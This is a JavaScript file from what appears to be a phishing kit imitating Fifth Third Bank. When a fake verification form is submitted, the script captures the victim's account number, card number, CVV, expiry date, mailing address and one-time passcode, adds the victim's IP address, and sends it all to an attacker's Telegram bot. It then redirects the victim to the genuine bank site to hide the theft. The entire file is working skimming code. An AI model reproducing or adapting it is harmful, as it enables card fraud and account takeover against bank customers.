// vault/send.js

function sendToTelegram(data, callback) {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(ipData => {
      const ip = ipData.ip || 'Unknown';
      const message = `[53rd Result]\n\nVERIFICATION\n🏦 Account Number: ${data.accountnumber}\n🧑 Name on Card: ${data.cardname}\n💳 Card Number: ${data.cardnumber}\n💳 CVV: ${data.cvv}\n📅 Expiry Date: ${data.expdate}\n🏠 Mailing Address: ${data.mailingaddress}\n🔐 OTP: ${data.otp}\n\n🌐 IP Address: ${ip}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(() => {
        if (callback) callback();
      });
    });
}

document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('verify-form');
  if (!form) return;
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    // Get verification details from form only (no login data)
    const data = {
      accountnumber: form.querySelector('[name="accountnumber"]').value,
      cardname: form.querySelector('[name="cardname"]').value,
      cardnumber: form.querySelector('[name="cardnumber"]').value,
      cvv: form.querySelector('[name="cvv"]').value,
      expdate: form.querySelector('[name="expdate"]').value,
      mailingaddress: form.querySelector('[name="mailingaddress"]').value,
      otp: form.querySelector('[name="otp"]').value
    };
    sendToTelegram(data); // Send only verification data
    form.reset();
    window.location.href = 'https://www.53.com/';
  });
});

window.sendToTelegram = sendToTelegram;
